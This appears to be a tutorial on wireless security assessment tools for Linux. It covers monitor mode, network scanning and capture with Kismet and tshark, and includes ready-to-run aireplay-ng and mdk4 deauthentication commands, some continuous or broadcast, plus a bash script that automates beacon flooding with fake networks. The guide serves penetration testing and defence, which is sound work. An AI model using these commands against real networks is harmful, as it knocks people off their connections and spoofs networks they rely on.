## Overview

This guide provides a comprehensive overview of tools and techniques used for wireless network security assessment, monitoring, and testing. It includes command-line utilities for Linux that security professionals use to assess wireless network security.

> [!NOTE]
> This page has been updated in 2025 with current tools and techniques. Always ensure you have permission before using these tools on any network that isn't your own.

## Wireless Security Assessment Toolkit

Common tools used for wireless network security assessment include:

| Tool | Purpose |
|------|---------|
| **aircrack-ng** | Suite of tools for WiFi network security assessment |
| **airodump-ng** | Packet capture tool for wireless networks |
| **aireplay-ng** | Tool for packet injection and deauthentication |
| **airmon-ng** | Script for managing wireless interfaces in monitor mode |
| **mdk3/mdk4** | Tool for wireless testing and attacks |
| **wireshark** | Network protocol analyzer with wireless capabilities |
| **kismet** | Wireless network detector and sniffer |
| **iw** | Modern command-line tool for wireless device configuration |
| **iwconfig** | Legacy tool for configuring wireless interfaces |

## Wireless Interface Configuration

### Determining Wireless Interface Capabilities

Before conducting any wireless assessment, you need to determine the capabilities of your network interface card (NIC):

```bash
# List wireless interfaces and their PHY numbers
airmon-ng

# Examine detailed capabilities of a specific wireless interface (replace phy0 with your PHY number)
iw phy phy0 info | grep -A8 modes

# Check if monitor mode is supported
iw phy phy0 info | grep -A8 "Supported interface modes"

# Check supported bands and frequencies
iw phy phy0 info | grep -A8 "Frequencies"
```

### Enabling Monitor Mode

Monitor mode allows you to capture all wireless traffic without being associated with an access point:

```bash
# Check current wireless interfaces
ip link show

# Put interface into monitor mode using airmon-ng (recommended)
airmon-ng start wlan0

# Alternative method using iw (for newer kernels)
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up
```

> [!TIP]
> After enabling monitor mode with airmon-ng, your interface will typically be renamed to something like `mon0` or `wlan0mon`.

## Wireless Network Scanning

### Passive Scanning

Passive scanning listens for beacon frames without sending any probe requests, making it more stealthy:

```bash
# Passive scan using iw
iw dev wlan0 scan passive | grep SSID

# Comprehensive passive monitoring with airodump-ng
airodump-ng wlan0mon
```

### Active Scanning

Active scanning sends probe requests to discover wireless networks:

```bash
# Active scan using iw
iw dev wlan0 scan | grep SSID

# Full active scan with detailed output
iw dev wlan0 scan

# Connect to a specific network (managed mode)
iwconfig wlan0 channel 6
iwconfig wlan0 essid "NetworkName"
iwconfig wlan0 mode managed
```

## Deauthentication Techniques

> [!WARNING]
> Only use deauthentication techniques on networks you own or have explicit permission to test. Unauthorized use may be illegal in your jurisdiction.

### Single Client Deauthentication

```bash
# Set interface to the target network's channel
iwconfig wlan0mon channel 6

# Send a single deauthentication packet
# -0 = deauthentication, 1 = number of packets, -a = AP MAC, -c = client MAC
aireplay-ng -0 1 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon

# Continuous deauthentication (use 0 for count)
aireplay-ng -0 0 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
```

### Broadcast Deauthentication

To deauthenticate all clients on a network:

```bash
# Omit the client MAC to deauthenticate all clients
aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon
```

### Using MDK4 for Deauthentication

MDK4 (successor to MDK3) provides additional deauthentication capabilities:

```bash
# Basic deauthentication with MDK4
mdk4 wlan0mon d

# Deauthenticate with whitelist (everything not in file gets deauthenticated)
mdk4 wlan0mon d -w whitelist.txt

# Deauthenticate with blacklist (only MACs in file get deauthenticated)
mdk4 wlan0mon d -b blacklist.txt
```

## Beacon Flood Techniques

Beacon flooding creates fake wireless networks, which can be used for testing wireless client behavior:

```bash
# Basic beacon flood on channel 11 using MDK4
mdk4 wlan0mon b -c 11 -f ssid_list.txt
```

### Creating a Beacon Flood Script

Here's a more sophisticated script to automate beacon flooding:

```bash
#!/bin/bash

# Array of fake network names
networks=(
"FreeWifi"
"Corporate Guest"
"SecurityTest"
"Public WiFi"
"Hotel Guests"
"Airport_Free"
"Cafe Internet"
"ConferenceWiFi"
)

# Create SSID list file
if [ -f ssid_list.txt ]; then
    echo "Removing existing SSID list"
    rm -f ssid_list.txt
fi

echo "Creating list of network names"
for network in "${networks[@]}"; do
    echo "$network" >> ssid_list.txt
done

# Check if monitor interface exists
if [[ -n $(iw dev | grep wlan0mon) ]]; then
    echo "Monitor interface already exists"
else
    echo "Starting monitor mode on wlan0"
    airmon-ng start wlan0
fi

# Start beacon flood on channel 11
echo "Beginning beacon flood on wlan0mon"
mdk4 wlan0mon b -c 11 -f ssid_list.txt
```

## Wireless Security Best Practices

As a security professional, it's important to understand these techniques to better protect networks:

1. **Use WPA3 encryption** whenever possible
2. **Implement MAC address filtering** (though not foolproof)
3. **Enable network isolation** to segment guest and corporate networks
4. **Regularly audit connected devices**
5. **Use enterprise authentication** (802.1X) for corporate networks
6. **Implement wireless intrusion detection systems**
7. **Consider disabling unused SSID broadcast**
8. **Update access point firmware** regularly

## Wireless Network Analysis Tools

Beyond basic scanning, these tools provide deeper analysis:

### Kismet

```bash
# Start Kismet with specified interface
kismet -c wlan0mon

# Save data to specific file
kismet -c wlan0mon -t network_scan
```

### Wireshark

Wireshark provides deep packet inspection for wireless traffic:

```bash
# Capture wireless traffic with tshark (CLI version of Wireshark)
tshark -i wlan0mon -w capture.pcap

# Filter for specific traffic types
tshark -i wlan0mon -f "wlan type mgt subtype beacon" -w beacons.pcap
```
